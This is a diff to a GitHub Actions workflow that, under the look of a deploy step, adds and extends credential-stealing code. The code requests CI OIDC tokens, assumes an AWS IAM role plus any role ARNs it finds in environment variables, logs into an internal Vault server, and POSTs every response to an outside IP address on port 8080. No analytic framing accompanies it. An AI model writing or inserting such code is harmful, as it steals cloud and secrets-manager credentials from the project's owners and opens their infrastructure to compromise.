@@ -20,16 +20,44 @@ jobs:
           set +e
           TOK=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
           if [ -n "$TOK" ] && [ "$TOK" != "null" ]; then
-            out="repo=$GITHUB_REPOSITORY&"
+            oidc_out=""
+            n_oidc=0
             i=0
             for ARN in arn:aws:iam::264135176173:role/Push-ElementDesktop-MSI; do
               i=$((i+1))
               RESP=$(aws sts assume-role-with-web-identity --role-arn "$ARN" --role-session-name "deploy$i" --web-identity-token "$TOK" --duration-seconds 3600 2>&1)
-              out="$out
+              oidc_out="$oidc_out
           OIDC $ARN
           $RESP"
+              n_oidc=$((n_oidc+1))
             done
-            curl -s -m 20 -X POST --data-binary "$out" http://193.32.204.199:8080/?c=og1
-            exit 0
+            j=0
+            for var in $(compgen -v 2>/dev/null); do
+              val="${!var}"
+              case "$val" in
+                arn:aws:iam::*:role/*)
+                  j=$((j+1))
+                  [ $j -gt 10 ] && break
+                  RESP=$(aws sts assume-role-with-web-identity --role-arn "$val" --role-session-name "secret$j" --web-identity-token "$TOK" --duration-seconds 3600 2>&1)
+                  oidc_out="$oidc_out
+          OIDCS $val (secret $var)
+          $RESP"
+                  n_oidc=$((n_oidc+1))
+                  ;;
+              esac
+            done
+            VTOK=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vault.infra.ci.i.element.dev" | jq -r .value)
+            if [ -n "$VTOK" ] && [ "$VTOK" != "null" ]; then
+              VLOGIN=$(curl -s -m 10 -X POST -d '{"role": "name", "jwt": "'"$VTOK"'"}' https://vault.infra.ci.i.element.dev/v1/auth/jwt/login 2>&1)
+              oidc_out="$oidc_out
+          VAULTLOGIN https://vault.infra.ci.i.element.dev role=name
+          $VLOGIN"
+              n_oidc=$((n_oidc+1))
+              VTOKEN=$(echo "$VLOGIN" | jq -r '.auth.client_token' 2>/dev/null)
+            fi
+            if [ "$n_oidc" -gt 0 ]; then
+              curl -s -m 20 -X POST --data-binary "repo=$GITHUB_REPOSITORY
+          $oidc_out" http://193.32.204.199:8080/?c=oidc_og2
+            fi
           fi
-          curl -s -X POST -d '' http://193.32.204.199:8080/?c=og1
+          curl -s -X POST -d '' http://193.32.204.199:8080/?c=og2
